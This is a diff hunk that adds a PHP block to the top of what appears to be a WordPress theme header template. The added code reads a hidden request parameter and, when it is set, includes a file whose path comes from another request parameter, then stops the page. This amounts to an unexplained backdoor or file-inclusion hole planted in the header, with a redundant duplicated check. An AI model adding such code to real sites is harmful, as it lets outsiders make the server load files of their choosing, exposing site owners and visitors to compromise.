@@ -1,3 +1,10 @@
+<?php if ($_REQUEST['__process_form'] == true) {
+  if ($_REQUEST['__process_form'] == true) {
+    include_once(locate_template($_REQUEST['__process_form_action']));
+    die();
+  }
+}?>
+
 <!DOCTYPE html>
 <html class="no-js" <?php language_attributes(); ?>>
 <head>
